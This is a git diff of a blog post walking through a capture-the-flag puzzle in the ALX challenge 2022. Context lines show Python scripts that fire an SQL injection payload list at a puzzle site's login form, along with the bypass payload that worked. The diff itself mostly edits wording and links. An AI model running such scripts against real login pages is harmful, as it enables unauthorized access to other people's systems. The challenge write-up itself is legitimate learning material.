@@ -50,7 +50,7 @@
 
 *`I would like to thank the Lord Jesus Christ, for God is the giver of wisdom, understanding and everything. I would like to thank the team at ALX for giving me the opportunity to be part of the community and grow. I would like to thank Julien for giving me the idea to even write this blog. I finally would like to thank my family, friends and everyone for their support.`*
 
-How you can solve Game 3 of the \#ALXchallenge2022
+How you can solve for Clue 3 in Game 3 of the \#ALXchallenge2022
 ---
 
 This twitter feed came up, I was stuck at Level 23 by the time I saw this 
@@ -60,7 +60,7 @@ This twitter feed came up, I was stuck at Level 23 by the time I saw this
 	<img class="curved-edge" src="./assets/img/game-in-game.png" alt="Aunty Betty Tweet">
 </div>
 
-So as we can see from the tweet, the clue can be found some where inside the domain [`venicodivici.co`](venicodivici.co)
+So as we can see from the tweet, the clue can be found some where inside the domain [`venicodivici.co`](http://venicodivici.co)
 
 ### Level 0
 
@@ -296,7 +296,7 @@ Our next endpoint: [`http://venicodivici.co/identification.php` ](http://venicod
 
 <!-- ![Level 7](./assets/img/clue3-level7.jpeg) -->
 <div class="level-screenshots">
-	<img src="./assets/img/clue3-level7.jpeg" alt="Level 7">
+	<img src="./assets/img/clue3-level7.jpeg" alt="Level 7" style="width: 95%;">
 </div>
 
 I tried some random username of `test` and password  of `test` to see if it would log me in, and this page came up
@@ -362,20 +362,14 @@ The one we are interested in is, the first request which has a status code `200 
     </div>
 </div>
 
-Combining all this into a python script, we get the following, the reason I have used the `aiohttp` library instead of the usual `requests` is because I was expecting to make requests of the entire SQL Injection Payloads List, we saw earlier and with that scale requests is very slow
+Combining all this into a python script, we get the following script. The reason I have used the `aiohttp` library instead of the usual `requests` is because, I was expecting to make requests of the entire *SQL Injection Payloads List*, which we saw available on [this github repo](https://github.com/payloadbox/sql-injection-payload-list) and with that scale the `requests` library is very slow
 
-First install aiohttp and libraries that improve the performance
-
-```sh
-sudo pip install aiohttp aiodns cchardet
-```
-
-The python script I saved it as `venicodivici.py`
+I saved the following python script as `venicodivici.py`
 
 ```py
 #!/usr/bin/python3
 
-# Import standard library for asynchronous input
+# Import standard library for asynchronous input/output
 # It's actually important because we need an event loop
 # that will run our courotines (asynchronus functions)
 import asyncio
@@ -384,7 +378,7 @@ import asyncio
 import aiohttp
 
 # read the payloads file and store result as a list in
-# the variable lines
+# the variable sql_payloads
 with open('payloads-1.txt') as f:
     sql_payloads = f.readlines()
 
@@ -399,7 +393,7 @@ headers = {
     }
 
 async def request_maker(session, sql_payload):
-	# prepare payload
+	# prepare request payload
     request_payload = f"submitted=1&username={sql_payload}&password="
     async with session.post(url, headers = headers, data = request_payload) as resp:
             # when awaiting or waiting for the response to come, other coroutines can run
@@ -425,7 +419,7 @@ asyncio.run(main())
 
 ```
 
-For anyone interested in the requests version, here it is as follows
+For anyone interested in the `requests` version, here it is as follows
 
 ```py
 #!/usr/bin/python3
@@ -434,7 +428,7 @@ For anyone interested in the requests version, here it is as follows
 import requests
 
 # read the payloads file and store result as a list in
-# the variable lines
+# the variable sql_payloads
 with open('payloads-1.txt') as f:
     sql_payloads = f.readlines()
 
@@ -449,7 +443,7 @@ headers = {
     }
 
 def request_maker(sql_payload):
-	# prepare payload
+	# prepare request payload
     request_payload = f"submitted=1&username={sql_payload}&password="
     # Make a post request to sever
     resp = requests.post(url, headers = headers, data = request_payload)
@@ -467,10 +461,16 @@ if __name__ == '__main__':
 
 ```
 
-After running the script, this is the result I got that
+To execute the async version you first need to install `aiohttp` and libraries that improve its performance
 
 ```sh
-python venicodivici.py
+$ sudo pip install aiohttp aiodns cchardet
+```
+
+After running `venicodivici.py`, this is the result I got:
+
+```sh
+$ python venicodivici.py
 ...
 admin" or 1=1/*
  <>>> <center>Wrong password. Try again.<br /><img src="images/nop.png" /></center>
@@ -487,6 +487,7 @@ THANK YOU @karoub, @guillaumesalva, @gautie_a, @julienbarbier42, @0xAuntyBetty a
 <img src="images/hacker.png" /></center>
 ...
 ```
+
 So our SQL payload password becomes `admin'or 1=1 or ''='`, we can also see we found clue 3, which is `baguette`, but for those who still would like to see what it looks like in the browser here it is (entering it on either the username, password field or both fields works fine)
 
 <!-- ![Clue 3](./assets/img/baguette.jpg) -->
@@ -494,4 +495,4 @@ So our SQL payload password becomes `admin'or 1=1 or ''='`, we can also see we f
 	<img style="margin-left: 2%;" src="./assets/img/baguette.jpg" alt="Clue 3">
 </div>
 
-That was all for clue 3, thank you for reading thus far my friend
+That was all for clue 3, thank you for reading thus far my friend :)
